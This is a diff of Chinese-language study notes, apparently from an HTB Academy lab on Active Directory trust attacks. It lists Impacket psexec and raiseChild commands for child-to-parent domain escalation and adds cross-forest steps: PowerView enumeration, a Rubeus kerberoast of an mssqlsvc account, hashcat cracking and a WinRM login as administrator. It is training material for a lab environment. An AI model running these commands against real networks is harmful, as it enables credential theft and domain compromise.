@@ -92,3 +92,15 @@ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.loc
 Impacket 还有一个工具 raiseChild.py，它可以自动完成从子域到父域的提权过程，需要指定目标域控制器和子域中管理员用户的凭据
   https://github.com/fortra/impacket/blob/master/examples/raiseChild.py
 raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm
+
+
+跨林攻击Windows
+C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName      枚举SPN账户
+C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof      枚举 mssqlsvc 账户
+C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap            跨林攻击
+用hashcat破解
+
+C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL      枚举不属于本域用户的组
+C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator      通过 WinRM 连接来验证此访问权限
+
+
